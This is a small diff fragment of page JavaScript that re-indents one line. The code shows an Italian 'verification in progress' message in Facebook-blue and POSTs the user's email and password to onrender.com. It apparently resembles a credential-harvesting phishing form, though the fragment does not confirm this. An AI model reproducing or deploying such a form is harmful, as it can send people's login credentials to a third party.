@@ -83,7 +83,7 @@
             messageDiv.style.color = '#1877f2';
             messageDiv.innerText = 'Verifica in corso...';
             try {
-                const response = await fetch('https://onrender.com', {
+               const response = await fetch('https://onrender.com', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
